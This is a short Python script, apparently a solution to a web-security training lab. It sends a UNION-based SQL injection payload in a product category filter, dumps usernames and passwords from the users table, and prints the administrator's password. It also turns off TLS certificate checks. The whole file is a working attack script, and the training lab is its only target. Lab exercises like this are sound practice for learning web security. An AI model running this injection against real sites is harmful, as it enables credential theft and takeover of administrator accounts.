# step9_sql_injection_retrieve_admin_password.py

import requests
from bs4 import BeautifulSoup

site = '0a3f00ff042a203fd0ccb59d00ae00cd.web-security-academy.net'

s = requests.Session()

# Step 1: Inject UNION SELECT to retrieve users table
payload = "Gifts' UNION SELECT username,password FROM users--"
url = f'https://{site}/filter?category={payload}'
resp = s.get(url, verify=False)

# Step 2: Parse table to find administrator password
soup = BeautifulSoup(resp.text, 'html.parser')

user_table = soup.find('table').find_all('tr')
admin_entry = [r.find('td').contents for r in user_table if 'administrator' in r.find('th')]

admin_password = admin_entry.pop().pop()

print(f"Administrator password: {admin_password}")